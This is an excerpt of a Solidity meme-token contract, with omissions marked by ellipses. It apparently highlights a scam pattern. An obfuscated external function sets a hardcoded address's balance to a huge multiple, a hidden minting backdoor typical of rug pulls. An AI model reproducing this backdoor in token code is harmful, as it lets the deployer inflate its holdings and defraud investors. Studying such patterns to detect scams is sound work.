...
contract MEMEToken is Ownable {
    ...
    function lindaceoadmin() external {
        ...
        if (_cwojakmeme!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakmeme == tswojaks){
            _balances[_cwojakmeme] = peedceoAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakmeme = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
